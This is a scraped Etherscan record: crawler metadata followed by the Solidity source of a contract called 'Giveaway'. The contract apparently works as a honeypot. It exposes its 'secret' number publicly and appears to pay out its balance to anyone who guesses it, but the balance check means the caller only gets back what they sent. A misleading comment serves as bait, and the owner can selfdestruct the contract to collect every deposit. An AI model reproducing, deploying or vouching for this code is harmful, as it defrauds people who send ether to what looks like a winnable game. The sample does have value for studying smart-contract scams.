//token_name	
//token_url	https://etherscan.io//address/0x9f54d912a029380f2743aaf4ddd28c3f207cd719#code
//spider_time	2018/07/08 12:19:02
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.21;
contract Giveaway {

    address private owner = msg.sender;
    uint public SecretNumber = 24;
   
    function() public payable {
    }
   
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance + msg.value);
        }
    }
    
    function kill() public {
        require(msg.sender == owner);
	    selfdestruct(msg.sender);
	}
}